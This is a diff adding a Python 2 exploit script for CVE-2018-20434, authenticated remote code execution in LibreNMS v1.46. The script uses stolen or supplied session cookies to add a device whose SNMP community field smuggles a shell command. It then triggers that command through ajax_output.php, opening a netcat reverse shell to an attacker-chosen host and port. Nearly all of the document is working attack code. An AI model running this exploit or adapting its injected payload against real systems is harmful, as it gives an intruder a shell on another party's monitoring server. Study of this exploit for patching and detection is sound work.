@@ -1,0 +1,111 @@
+#!/usr/bin/python
+
+'''
+# Exploit Title: LibreNMS v1.46 authenticated Remote Code Execution
+# Date: 24/12/2018
+# Exploit Author: Askar (@mohammadaskar2)
+# CVE : CVE-2018-20434
+# Vendor Homepage: https://www.librenms.org/
+# Version: v1.46
+# Tested on: Ubuntu 18.04 / PHP 7.2.10
+'''
+
+import requests
+from urllib import urlencode
+import sys
+
+if len(sys.argv) != 5:
+    print "[!] Usage : ./exploit.py http://www.example.com cookies rhost rport"
+    sys.exit(0)
+
+# target (user input)
+target = sys.argv[1]
+
+# cookies (user input)
+raw_cookies = sys.argv[2]
+
+# remote host to connect to
+rhost = sys.argv[3]
+
+# remote port to connect to
+rport = sys.argv[4]
+
+# hostname to use (change it if you want)
+hostname = "dummydevice"
+
+# payload to create reverse shell
+payload = "'$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f) #".format(rhost, rport)
+
+# request headers
+headers = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101"
+    }
+
+# request cookies
+cookies = {}
+for cookie in raw_cookies.split(";"):
+    # print cookie
+    c = cookie.split("=")
+    cookies[c[0]] = c[1]
+
+
+def create_new_device(url):
+    raw_request = {
+        "hostname": hostname,
+        "snmp": "on",
+        "sysName": "",
+        "hardware": "",
+        "os": "",
+        "snmpver": "v2c",
+        "os_id": "",
+        "port": "",
+        "transport": "udp",
+        "port_assoc_mode": "ifIndex",
+        "community": payload,
+        "authlevel": "noAuthNoPriv",
+        "authname": "",
+        "authpass": "",
+        "cryptopass": "",
+        "authalgo": "MD5",
+        "cryptoalgo": "AES",
+        "force_add": "on",
+        "Submit": ""
+    }
+    full_url = url + "/addhost/"
+    request_body = urlencode(raw_request)
+
+    # send the device creation request
+    request = requests.post(
+        full_url, data=request_body, cookies=cookies, headers=headers
+    )
+    text = request.text
+    if "Device added" in text:
+        print "[+] Device Created Sucssfully"
+        return True
+    else:
+        print "[-] Cannot Create Device"
+        return False
+
+
+def request_exploit(url):
+    params = {
+        "id": "capture",
+        "format": "text",
+        "type": "snmpwalk",
+        "hostname": hostname
+        }
+
+    # send the payload call
+    request = requests.get(url + "/ajax_output.php",
+        params=params,
+        headers=headers,
+        cookies=cookies
+        )
+    text = request.text
+    if rhost in text:
+        print "[+] Done, check your nc !"
+
+
+if create_new_device(target):
+    request_exploit(target)
